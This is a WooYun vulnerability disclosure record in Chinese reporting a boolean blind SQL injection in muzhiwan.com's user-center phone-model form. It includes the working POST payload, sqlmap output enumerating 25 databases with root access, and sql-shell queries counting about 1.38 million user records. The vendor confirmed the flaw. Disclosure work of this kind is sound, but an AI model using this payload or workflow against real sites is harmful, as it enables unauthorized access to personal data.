{"id": 71596, "wybug_id": "wooyun-2015-0147726", "wybug_title": "拇指玩主站SQL注入影响百万用户数据", "wybug_corp": "muzhiwan.com", "wybug_author": "路人甲", "wybug_date": "2015-10-19 11:57", "wybug_open_date": "2015-12-03 12:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-03：\t细节向公众公开  简要描述： 拇指玩主站注入影响百万用户数据 详细说明：  注入点位于主站用户中心->修改手机型号处\nPOST /index.php?action=profile&opt=Model HTTP/1.1Host: u.muzhiwan.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://u.muzhiwan.com/index.php?action=profile&opt=ModelContent-Length: 89Cookie: __utma=203078925.498Connection: keep-alivePragma: no-cacheCache-Control: no-cachebrandname=5-if(1=1 AND length(database())=3,0,(select 1 union select 2))&productname=1193\nmysql bool 盲注   漏洞证明：  sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: (custom) POSTParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=album&aid=1 or 1=1-if(1=1  AND 4174=4174 ,0,(select 1 union select 2))---[03:12:54] [INFO] testing MySQL[03:12:54] [INFO] confirming MySQL[03:12:54] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.14back-end DBMS: MySQL >= 5.0.0[03:12:54] [INFO] fetching database names[03:12:54] [INFO] fetching number of databases[03:12:54] [INFO] resumed: 25[03:12:54] [INFO] resumed: information_schema[03:12:54] [INFO] resumed: anquanxia[03:12:54] [INFO] resumed: applanet_user[03:12:54] [INFO] resumed: bug[03:12:54] [INFO] resumed: googleinstall[03:12:54] [INFO] resumed: googlemarket[03:12:54] [INFO] resumed: googlemarketgame[03:12:54] [INFO] resumed: muzhiwan[03:12:54] [INFO] resumed: muzhiwan130409[03:12:54] [INFO] resumed: muzhiwan130417[03:12:54] [INFO] resumed: muzhiwanbbs[03:12:54] [INFO] resumed: muzhiwanbbstest[03:12:54] [INFO] resumed: muzhiwantest[03:12:54] [INFO] resumed: mysql[03:12:54] [INFO] resumed: mzw[03:12:54] [INFO] resumed: mzw_new_gz[03:12:54] [INFO] resumed: mzw_oa[03:12:54] [INFO] resumed: mzwtest[03:12:54] [INFO] resumed: redmine[03:12:54] [INFO] resumed: sdk[03:12:54] [INFO] resumed: stat[03:12:54] [INFO] resumed: stat_sdk[03:12:54] [INFO] resumed: test[03:12:54] [INFO] resumed: testlink[03:12:54] [INFO] resumed: wikidatabaseavailable databases [25]:[*] anquanxia[*] applanet_user[*] bug[*] googleinstall[*] googlemarket[*] googlemarketgame[*] information_schema[*] muzhiwan[*] muzhiwan130409[*] muzhiwan130417[*] muzhiwanbbs[*] muzhiwanbbstest[*] muzhiwantest[*] mysql[*] mzw[*] mzw_new_gz[*] mzw_oa[*] mzwtest[*] redmine[*] sdk[*] stat[*] stat_sdk[*] test[*] testlink[*] wikidatabaseroot权限，貌似所有数据库都在了。看看用户表sql-shell> select count(*) from muzhiwanbbs.pre_ucenter_members[03:05:24] [INFO] fetching SQL SELECT statement query output: 'select count(*) from muzhiwanbbs.pre_ucenter_members'[03:05:24] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[03:05:24] [INFO] retrieved: 1386124select count(*) from muzhiwanbbs.pre_ucenter_members:    '1386124'sql-shell> select count(*) from mzw.mzw_users    影响138w论坛用户数据   修复方案：  你懂   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-10-19 12:00 厂商回复： 谢谢，我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}